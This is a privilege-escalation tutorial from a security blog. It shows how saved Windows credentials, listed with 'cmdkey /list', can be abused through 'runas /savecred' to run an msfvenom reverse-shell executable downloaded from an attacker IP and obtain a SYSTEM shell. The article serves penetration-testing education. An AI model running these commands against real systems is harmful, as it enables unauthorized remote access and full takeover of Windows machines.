<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Privilege Escalation: Stored Credentials (Runas)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/" rel="bookmark"><time class="entry-date published" datetime="2021-10-20T15:20:03+00:00">October 20, 2021</time><time class="updated" datetime="2025-05-10T20:28:26+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong data-start="148" data-end="183">Stored Credentials Exploitation</strong> is a technique <strong data-start="199" data-end="212">attackers</strong> use to increase <strong data-start="229" data-end="243">privileges</strong> in <strong data-start="247" data-end="268">Microsoft Windows</strong>. Therefore, it allows attackers to escalate their access by exploiting weaknesses in how credentials are stored within the system. Windows offers a wide range of fine-grained permissions and privileges for controlling access to its components, including services, files, and registry entries. Exploiting stored credentials is one such method to escalate privileges.</span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<p><strong><span style="color: #000000;">Introduction</span></strong></p>
<ul>
<li><span style="color: #000000;">Credential Manager</span></li>
<li><span style="color: #000000;">Web credentials</span></li>
<li><span style="color: #000000;">Windows credentials</span></li>
</ul>
<p><strong><span style="color: #000000;">Abusing Stored Credential</span></strong></p>
<ul>
<li><span style="color: #000000;">Create Malicious Executable</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Introduction</strong></span></h3>
<p><span style="color: #000000;"><strong>Credential Manager</strong> lets you view and delete your saved credentials for signing in to websites, connected applications, and networks. It is like a digital vault to keep all of your credentials safe.  </span></p>
<p><span style="color: #000000;"><strong>Web credentials:</strong> As Edge and widows are the product of the same company, the credentials manager has access to the stored information of the Edge browser too, in order to increase the safekeeping of saved credentials. It also stores the password of order applications provided by Microsoft such as skype, Microsoft office, etc.</span></p>
<p><span style="color: #000000;"><strong data-start="405" data-end="428">Windows credentials</strong>: In this category, you can find all <strong data-start="465" data-end="494">Windows login credentials</strong>. Additionally, this includes credentials for any system connected to the <strong data-start="572" data-end="583">network</strong>.</span></p>
<p><strong><span style="color: #000000;">In our <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/credential-dumping-windows-credential-manager/">previous</a> </span>article, we have explained how an attacker can dump the credential from this digital vault.</span></strong></p>
<ol>
<li><span style="color: #000000;">To open Credential Manager, You can open the control panel &gt; user accounts &gt; credential manager.</span></li>
<li><span style="color: #000000;">Select Web Credentials or Windows Credentials to access the credentials you want to manage.</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjK63vLj-GIBsPcAo2UUb_hTyj36R3NXAjZyJcZGp0KAUcBQPFvLQMBuBTvY40wZcaiTlCTxZH9DobpZ0H2MiwrPLGKgKZOCbk-nbloQiwac6azNYAUZgX2nNs8TKidLTI4Uo4bf2rkX21E2hLF76hQVYAks951kPUKor3-o8XiK8EvbvXRReBQJPprlA=s16000"/></span></p>
<h3><span style="color: #800000;"><strong>Abusing Stored Credential</strong></span></h3>
<p><span style="color: #000000;">If an attacker identifies stored credential entry for an administrator account then the attacker can go for privilege escalation by executing a malicious file with the help of runas utility.</span></p>
<p><span style="color: #000000;">To enumerate a list of all user names and credentials that are stored, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmdkey /list</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgmRrTHj1trtdsRrqKDlEicTJ15OrFsMFxxKPONAQAD9d2BMPP0W5BnMq6P4mNBIdYhHPZ6M2gs1i1_vqfNuPFRAFCuHNcJqzfPCvd194D3K86WPUM8xTMchVA7aD5A2lMQGQZxezRqPX-5eqqIkjtWF9I15S3HqDJ5xhgllstBo4Rx8f__-KnKjrrpKg=s16000"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Create Malicious Executable</span> </strong></span></h3>
<p><span style="color: #000000;">To get a reverse shell as NT Authority SYSTEM, let’s create a malicious exe file that could be executed using runas utility. It allows a user to run specific tools and programs with different permissions than the user’s current logon provides.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom –p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe &gt; shell.exe
python –m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjysxtZWKPm14tY4_wKFHs4_K1CYyaFoSJnFNyOT3RIaJhV38cMMPh-n0v_0VcwtUeaz4zH-3StFzJFB3j677TpjM2QnJx_mTDhBy9zy7A81b1TYnMJM1wpAeHC6xUHdBXNv27Bp6_9F4OjJGFW-dFuMk9M7Wku628WD7UsU9-nWLmLd5UsU8XCyuw_OQ=s16000"/></span></p>
<p><span style="color: #000000;">Start a netcat listener in a new terminal and transfer the shell.exe and execute it with the help of the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.1.3/shell.exe -o shell.exe
runas /savecred /user:WORKGROUP\Administrator "C:\Users\ignite\Downloads\shell.exe"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgAfkaTslis3tkdAlqHSHcMBBUWAiu74-wdLADR1eJ2hp1-z1vEF9Jh4Snz58yeK5RA61aAETo0CAm1XEyKUA4UmQKecVF3EMpeimwrP_LmwPH9yWrYBfrPYsLfLQZDTZkM1qWkxWz9uOt_Vqjx_XUseJm-6lagu4v_MOlaLj6OUqXLwhrIVkEqQrKuUQ=s16000"/></span></p>
<p><span style="color: #000000;">The attacker will get a reverse connection in the new netcat session as NT Authority \System</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg23PbdV98VaF7Ymye1mNSk62JvqwUPH74VW1Js0q-V7K9YLAWrjUrLhGm0PSulAgNOvQzQq0LRdKk4t3UsFaHP04XP6eeO85UbWhCyJay6UewjzzT9U9m3lAvErzpzbANMUlp7LY6I0x4JIw83wfRYy3wdMdloMpQHuFkwsfVG9ZwbTKews0pvwzh-Fw=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
